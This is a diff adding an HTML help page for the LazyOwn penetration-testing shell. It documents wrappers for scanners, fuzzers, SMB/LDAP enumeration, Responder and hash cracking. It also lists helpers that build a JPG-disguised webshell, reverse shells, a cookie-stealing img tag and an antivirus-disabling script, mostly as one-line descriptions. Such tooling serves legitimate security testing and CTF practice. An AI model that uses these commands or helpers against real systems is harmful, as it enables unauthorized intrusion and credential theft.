+<p>Manual execution: To manually interact with a remote Windows system
+using RPC, use the following command: rpcclient -U ’’ -N <target_ip></p>
+<p>Replace <code>&lt;target_ip&gt;</code> with the IP address of the
+target system. For example: rpcclient -U ’’ -N 10.10.10.10</p>
+<h2 id="nikto">nikto</h2>
+<p>Runs the <code>nikto</code> tool to perform a web server
+vulnerability scan against the specified target host.</p>
+<ol type="1">
+<li>Executes <code>nikto</code> with the <code>-h</code> option to
+specify the target host IP address.</li>
+</ol>
+<p>:param line: This parameter is not used in the current implementation
+but could be used to specify additional options or arguments if needed.
+:param rhost: The IP address of the target web server, specified in the
+<code>params</code> dictionary.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually perform a web server vulnerability scan
+using <code>nikto</code>, use the following command: nikto -h
+<target_ip></p>
+<p>Replace <code>&lt;target_ip&gt;</code> with the IP address of the
+target web server. For example: nikto -h 10.10.10.10</p>
+<h2 id="openssl_sclient">openssl_sclient</h2>
+<p>Uses <code>openssl s_client</code> to connect to a specified host and
+port, allowing for testing and debugging of SSL/TLS connections.</p>
+<p>:param line: The port number to connect to on the target host. This
+must be provided as an argument. :param rhost: The IP address or
+hostname of the target server, specified in the <code>params</code>
+dictionary.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually connect to a server using
+<code>openssl s_client</code> and test SSL/TLS, use the following
+command: openssl s_client -connect <target_ip>:<port></p>
+<p>Replace <code>&lt;target_ip&gt;</code> with the IP address or
+hostname of the target server and <code>&lt;port&gt;</code> with the
+port number. For example: openssl s_client -connect 10.10.10.10:443</p>
+<h2 id="ss">ss</h2>
+<p>Uses <code>searchsploit</code> to search for exploits in the Exploit
+Database based on the provided search term.</p>
+<p>:param line: The search term or query to find relevant exploits. This
+must be provided as an argument.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually search for exploits using
+<code>searchsploit</code>, use the following command: searchsploit
+<search_term></p>
+<p>Replace <code>&lt;search_term&gt;</code> with the term or keyword you
+want to search for. For example: searchsploit kernel</p>
+<h2 id="wfuzz">wfuzz</h2>
+<p>Uses <code>wfuzz</code> to perform fuzzing based on provided
+parameters. This function supports various options for directory and
+file fuzzing.</p>
+<p>:param line: The options and arguments for <code>wfuzz</code>. The
+<code>line</code> parameter can include the following: -
+<code>sub &lt;domain&gt;</code>: Fuzz DNS subdomains. Requires
+<code>dnswordlist</code> to be set. - <code>iis</code>: Fuzz IIS
+directories. Uses a default wordlist if <code>iiswordlist</code> is not
+set. - Any other argument: General directory and file fuzzing.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually use <code>wfuzz</code> for directory
+and file fuzzing, use the following commands:</p>
+<ol type="1">
+<li>For fuzzing DNS subdomains: wfuzz -c <extra_options> -t <threads> -w
+<wordlist> -H ‘Host: FUZZ.<domain>’ <domain></li>
+</ol>
+<p>Example: wfuzz -c –hl=7 -t 200 -w /path/to/dnswordlist -H ‘Host:
+FUZZ.example.com’ example.com</p>
+<ol start="2" type="1">
+<li>For fuzzing IIS directories: wfuzz -c <extra_options> -t <threads>
+-w /path/to/iiswordlist http://<rhost>/FUZZ</li>
+</ol>
+<p>Example: wfuzz -c –hl=7 -t 200 -w
+/usr/share/wordlists/SecLists-master/Discovery/Web-Content/IIS.fuzz.txt
+http://10.10.10.10/FUZZ</p>
+<ol start="3" type="1">
+<li>For general directory and file fuzzing: wfuzz -c <extra_options> -t
+<threads> -w <wordlist> http://<rhost>/FUZZ</li>
+</ol>
+<p>Example: wfuzz -c –hl=7 -t 200 -w /path/to/dirwordlist
+http://10.10.10.10/FUZZ</p>
+<h2 id="launchpad">launchpad</h2>
+<p>Searches for packages on Launchpad based on the provided search term
+and extracts codenames from the results. The distribution is extracted
+from the search term.</p>
+<p>:param line: The search term to be used for querying Launchpad. The
+<code>line</code> parameter should be a string containing the search
+term, e.g., “8.2p1 Ubuntu 4ubuntu0.11”.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually execute the equivalent command, use the
+following steps:</p>
+<ol type="1">
+<li>Extract the distribution from the search term:</li>
+</ol>
+<ul>
+<li>This function assumes the distribution name is part of the search
+term and is used to build the URL.</li>
+</ul>
+<ol start="2" type="1">
+<li>URL encode the search term:</li>
+</ol>
+<ul>
+<li>Replace spaces with <code>%20</code> to form the encoded search
+query.</li>
+</ul>
+<ol start="3" type="1">
+<li>Use <code>curl</code> to perform the search and filter results: curl
+-s “https://launchpad.net/+search?field.text=<encoded_search_term>” |
+grep ‘href’ | grep ‘<distribution>’ | grep -oP
+‘(?&lt;=href=“https://launchpad.net/<distribution>/)[^/"]+’ | sort
+-u</li>
+</ol>
+<p>Example: If the search term is “8.2p1 Ubuntu 4ubuntu0.11”, the
+command would be: curl -s
+“https://launchpad.net/+search?field.text=8.2p1%20Ubuntu%204ubuntu0.11”
+| grep ‘href’ | grep ‘ubuntu’ | grep -oP
+‘(?&lt;=href=“https://launchpad.net/ubuntu/)[^/"]+’ | sort -u</p>
+<p>Notes: - Ensure that <code>curl</code> is installed and accessible in
+your environment. - The extracted codenames are printed to the
+console.</p>
+<h2 id="gobuster">gobuster</h2>
+<p>Uses <code>gobuster</code> for directory and virtual host fuzzing
+based on provided parameters. Supports directory enumeration and virtual
+host discovery.</p>
+<p>:param line: The options and arguments for <code>gobuster</code>. The
+<code>line</code> parameter can include the following: -
+<code>url</code>: Perform directory fuzzing on a specified URL. Requires
+<code>url</code> and <code>dirwordlist</code> to be set. -
+<code>vhost</code>: Perform virtual host discovery on a specified URL.
+Requires <code>url</code> and <code>dirwordlist</code> to be set. - Any
+other argument: General directory fuzzing with additional
+parameters.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually use <code>gobuster</code>, use the
+following commands:</p>
+<ol type="1">
+<li>For directory fuzzing: gobuster dir –url <url>/ –wordlist
+<wordlist></li>
+</ol>
+<p>Example: gobuster dir –url http://example.com/ –wordlist
+/path/to/dirwordlist</p>
+<ol start="2" type="1">
+<li>For virtual host discovery: gobuster vhost –append-domain -u <url>
+-w <wordlist> –random-agent -t 600</li>
+</ol>
+<p>Example: gobuster vhost –append-domain -u http://example.com -w
+/path/to/dirwordlist –random-agent -t 600</p>
+<ol start="3" type="1">
+<li>For general directory fuzzing with additional parameters: gobuster
+dir –url http://<rhost>/ –wordlist <wordlist>
+<additional_parameters></li>
+</ol>
+<p>Example: gobuster dir –url http://10.10.10.10/ –wordlist
+/path/to/dirwordlist -x .php,.html</p>
+<h2 id="addhosts">addhosts</h2>
+<p>Adds an entry to the <code>/etc/hosts</code> file, mapping an IP
+address to a domain name.</p>
+<p>:param line: The domain name to be added to the
+<code>/etc/hosts</code> file. - Example: <code>permx.htb</code></p>
+<p>:returns: None</p>
+<p>Manual execution: To manually add a domain to the
+<code>/etc/hosts</code> file, use the following command:</p>
+<pre><code>sudo sh -c -e &quot;echo &#39;&lt;rhost&gt; &lt;domain&gt;&#39; &gt;&gt; /etc/hosts&quot;</code></pre>
+<p>Example: sudo sh -c -e “echo ‘10.10.11.23 permx.htb’ &gt;&gt;
+/etc/hosts”</p>
+<p>This command appends the IP address and domain name to the
+<code>/etc/hosts</code> file, enabling local resolution of the
+domain.</p>
+<h2 id="cme">cme</h2>
+<p>Performs an SMB enumeration using <code>crackmapexec</code>.</p>
+<p>:param line: Not used in this function.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually run <code>crackmapexec</code> for SMB
+enumeration, use the following command:</p>
+<pre><code>crackmapexec smb &lt;target&gt;</code></pre>
+<p>Example: crackmapexec smb 10.10.11.24</p>
+<p>This command will enumerate SMB shares and perform basic SMB checks
+against the specified target IP address.</p>
+<h2 id="ldapdomaindump">ldapdomaindump</h2>
+<p>Dumps LDAP information using <code>ldapdomaindump</code> with
+credentials from a file.</p>
+<p>:param line: The domain to use for authentication (e.g.,
+‘domain.local’).</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually run <code>ldapdomaindump</code> for
+LDAP enumeration, use the following command:</p>
+<pre><code>ldapdomaindump -u &#39;&lt;domain&gt;\&lt;username&gt;&#39; -p &#39;&lt;password&gt;&#39; &lt;target&gt;</code></pre>
+<p>Example: ldapdomaindump -u ‘domain.local’ -p ‘passadmin123’
+10.10.11.23</p>
+<p>Ensure you have a file <code>sessions/credentials.txt</code> in the
+format <code>user:password</code>, where each line contains credentials
+for the LDAP enumeration.</p>
+<h2 id="bloodhound">bloodhound</h2>
+<p>Perform LDAP enumeration using bloodhound-python with credentials
+from a file.</p>
+<p>:param line: This parameter is not used in the function but could be
+used for additional options or domain information.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually run <code>bloodhound-python</code> for
+LDAP enumeration, use the following command:</p>
+<pre><code>bloodhound-python -c All -u &#39;&lt;username&gt;&#39; -p &#39;&lt;password&gt;&#39; -ns &lt;target&gt;</code></pre>
+<p>Example: bloodhound-python -c All -u ‘usuario’ -p ‘password’ -ns
+10.10.10.10</p>
+<p>Ensure you have a file <code>sessions/credentials.txt</code> with the
+format <code>user:password</code>, where each line contains credentials
+for enumeration.</p>
+<h2 id="ping">ping</h2>
+<p>Perform a ping to check host availability and infer the operating
+system based on TTL values.</p>
+<p>:param line: This parameter is not used in the function but could be
+used for additional options or settings.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually ping a host and determine its operating
+system, use the following command:</p>
+<pre><code>ping -c 1 &lt;target&gt;</code></pre>
+<p>Example: ping -c 1 10.10.10.10</p>
+<p>The TTL (Time To Live) value is used to infer the operating system: -
+TTL values around 64 typically indicate a Linux system. - TTL values
+around 128 typically indicate a Windows system.</p>
+<p>Ensure you have set <code>rhost</code> to the target host for the
+command to work.</p>
+<h2 id="gospider">gospider</h2>
+<p>try gospider</p>
+<h2 id="arpscan">arpscan</h2>
+<p>try arp-scan</p>
+<h2 id="lazypwn">lazypwn</h2>
+<p>LazyPwn</p>
+<h2 id="fixel">fixel</h2>
+<p>to fix perms</p>
+<h2 id="smbserver">smbserver</h2>
+<p>Lazy imacket smbserver</p>
+<h2 id="sqlmap">sqlmap</h2>
+<p>Lazy sqlmap try sqlmap -wizard if don’t know how to use requests.txt
+file always start with req and first parameter</p>
+<h2 id="proxy">proxy</h2>
+<p>Small proxy to modify the request on the fly…</p>
+<h2 id="createwebshell">createwebshell</h2>
+<p>Crea una webshell disfrazada de jpg en el directorio sessions/</p>
+<h2 id="createrevshell">createrevshell</h2>
+<p>Crea un script en el directorio sessions con una reverse shell con
+los datos en lhost y lport</p>
+<h2 id="createwinrevshell">createwinrevshell</h2>
+<p>Crea un script en el directorio sessions con una reverse shell con
+los datos en lhost y lport</p>
+<h2 id="createhash">createhash</h2>
+<p>Crea un archivo hash.txt en el directorio sessions</p>
+<h2 id="createcredentials">createcredentials</h2>
+<p>Crea un archivo credentials.txt en el directorio sessions el forato
+debe ser: user:password</p>
+<h2 id="createcookie">createcookie</h2>
+<p>Crea un archivo cookie.txt en el directorio sessions con el formato
+de una cookie válida.</p>
+<h2 id="download_resources">download_resources</h2>
+<p>download resources in sessions</p>
+<h2 id="download_exploit">download_exploit</h2>
+<p>download exploits in external/.exploits/</p>
+<h2 id="dirsearch">dirsearch</h2>
+<p>dirsearch -u http://url.ext/ -x 403,404,400</p>
+<h2 id="john2hash">john2hash</h2>
+<p>example: sudo john hash.txt
+–wordlist=/usr/share/wordlists/rockyou.txt -format=Raw-SHA512</p>
+<h2 id="hashcat">hashcat</h2>
+<p>hashcat -a 0 -m mode hash /usr/share/wordlists/rockyou.txt</p>
+<h2 id="complete_hashcat">complete_hashcat</h2>
+<p>Complete mode options and file paths for the sessions/hash.txt</p>
+<h2 id="responder">responder</h2>
+<p>sudo responder -I tun0</p>
+<h2 id="ip">ip</h2>
+<p>ip a show scope global | awk ’/<a href="#fn1" class="footnote-ref"
+id="fnref1" role="doc-noteref"><sup>1</sup></a>+:/ { sub(/:/,““,$2);
+iface=$2 } /<a href="#fn2" class="footnote-ref" id="fnref2"
+role="doc-noteref"><sup>2</sup></a>*inet / { split($2, a, “/”); print ”
+[[96m” iface”[0m] “a[1] }’ and copy de ip to clipboard :)</p>
+<h2 id="rhost">rhost</h2>
+<p>Copy rhost to clipboard</p>
+<h2 id="banner">banner</h2>
+<p>Show the banner</p>
+<h2 id="py3ttyup">py3ttyup</h2>
+<p>copy to clipboard tipical python3 -c ’import pty; pty.spawn … bla bla
+blah…</p>
+<h2 id="rev">rev</h2>
+<p>Copy a revshell to clipboard</p>
+<h2 id="img2cookie">img2cookie</h2>
+<p>Copy a malicious img tag to clipboard</p>
+<h2 id="disableav">disableav</h2>
+<p>visual basic script to try to disable antivirus</p>
+<h2 id="conptyshell">conptyshell</h2>
+<p>Download ConPtyShell in sessions directory and copy to clipboard the
+command :D</p>
+<h2 id="pwncatcs">pwncatcs</h2>
+<p>run pwncat-cs -lp <PORT> :)</p>
+<h2 id="find">find</h2>
+<p>copy to clipboard this command always forgot :) find / -type f -perm
+-4000 2&gt;/dev/null</p>
+<h2 id="sh">sh</h2>
+<p>execute some command direct in shell to avoid exit LazyOwn ;)</p>
+<h2 id="pwd">pwd</h2>
+<p>’echo -e “[`. It converts a single remote host into a list if
+necessary, and then iterates over each host, performing the given
+function with each host. After the operation, it restores the original
+remote host value.</p>
+<p>:param func: The function to be decorated and executed for each
+remote host. :type func: function :return: The decorated function.
+:rtype: function</p>
+<h2 id="check_sudo">check_sudo</h2>
+<p>Checks if the script is running with superuser (sudo) privileges, and
+if not, restarts the script with sudo privileges.</p>
+<p>This function verifies if the script is being executed with root
+privileges by checking the effective user ID. If the script is not
+running as root, it prints a warning message and restarts the script
+using sudo.</p>
+<p>:return: None</p>
+<h2 id="activate_virtualenv">activate_virtualenv</h2>
+<p>Activates a virtual environment and starts an interactive shell.</p>
+<p>This function activates a virtual environment located at
+<code>venv_path</code> and then launches an interactive bash shell with
+the virtual environment activated.</p>
+<p>:param venv_path: The path to the virtual environment directory.
+:type venv_path: str :return: None</p>
+<h2 id="parse_proc_net_file">parse_proc_net_file</h2>
+<p>Internal function to parse a /proc/net file and extract network
+ports.</p>
+<p>This function reads a file specified by <code>file_path</code>,
+processes each line to extract local addresses and ports, and converts
+them from hexadecimal to decimal. The IP addresses are converted from
+hexadecimal format to standard dot-decimal notation. The function
+returns a list of tuples, each containing an IP address and a port
+number.</p>
+<p>:param file_path: The path to the /proc/net file to be parsed. :type
+file_path: str :return: A list of tuples, each containing an IP address
+and a port number. :rtype: list of tuple</p>
+<h2 id="get_open_ports">get_open_ports</h2>
+<p>Internal function to get open TCP and UDP ports on the operating
+system.</p>
+<p>This function uses the <code>parse_proc_net_file</code> function to
+extract open TCP and UDP ports from the corresponding /proc/net files.
+It returns two lists: one for TCP ports and one for UDP ports.</p>
+<p>:return: A tuple containing two lists: the first list with open TCP
+ports and the second list with open UDP ports. :rtype: tuple of (list of
+tuple, list of tuple)</p>
+<h2 id="find_credentials">find_credentials</h2>
+<p>Searches for potential credentials in files within the specified
+directory.</p>
+<p>This function uses a regular expression to find possible credentials
+such as passwords, secrets, API keys, and tokens in files within the
+given directory. It iterates through all files in the directory and
+prints any matches found.</p>
+<p>:param directory: The directory to search for files containing
+credentials. :type directory: str :return: None</p>
+<h2 id="rotate_char">rotate_char</h2>
+<p>Internal function to rotate characters for ROT cipher.</p>
+<p>This function takes a character and a shift value, and rotates the
+character by the specified shift amount. It only affects alphabetical
+characters, leaving non-alphabetical characters unchanged.</p>
+<p>:param c: The character to be rotated. :type c: str :param shift: The
+number of positions to shift the character. :type shift: int :return:
+The rotated character. :rtype: str</p>
+<h2 id="get_network_info">get_network_info</h2>
+<p>Retrieves network interface information with their associated IP
+addresses.</p>
+<p>This function executes a shell command to gather network interface
+details, parses the output to extract interface names and their
+corresponding IP addresses, and returns this information in a dictionary
+format. The dictionary keys are interface names, and the values are IP
+addresses.</p>
+<p>:return: A dictionary where the keys are network interface names and
+the values are their associated IP addresses. :rtype: dict</p>
+<h2 id="getprompt">getprompt</h2>
+<p>Generate a command prompt string with network information and user
+status.</p>
+<p>:param: None</p>
+<p>:returns: A string representing the command prompt with network
+information and user status.</p>
+<p>Manual execution: To manually get a prompt string with network
+information and user status, ensure you have
+<code>get_network_info()</code> implemented to return a dictionary of
+network interfaces and their IPs. Then use the function to create a
+prompt string based on the current user and network info.</p>
+<p>Example: If the function <code>get_network_info()</code> returns: {
+‘tun0’: ‘10.0.0.1’, ‘eth0’: ‘192.168.1.2’ }</p>
+<p>And the user is root, the prompt string generated might be:
+[LazyOwn👽10.0.0.1]# If the user is not root, it would be:
+[LazyOwn👽10.0.0.1]$</p>
+<p>If no ‘tun’ interface is found, the function will use the first
+available IP or fallback to ‘127.0.0.1’.</p>
+<h2 id="wrapper">wrapper</h2>
+<p>internal wrapper of internal function to implement multiples rhost to
+operate.</p>
+<section id="footnotes" class="footnotes footnotes-end-of-document"
+role="doc-endnotes">
+<hr />
+<ol>
+<li id="fn1"><p>0-9<a href="#fnref1" class="footnote-back"
+role="doc-backlink">↩︎</a></p></li>
+<li id="fn2"><p>[:space:]<a href="#fnref2" class="footnote-back"
+role="doc-backlink">↩︎</a></p></li>
+</ol>
+</section>
+</body>
+</html>
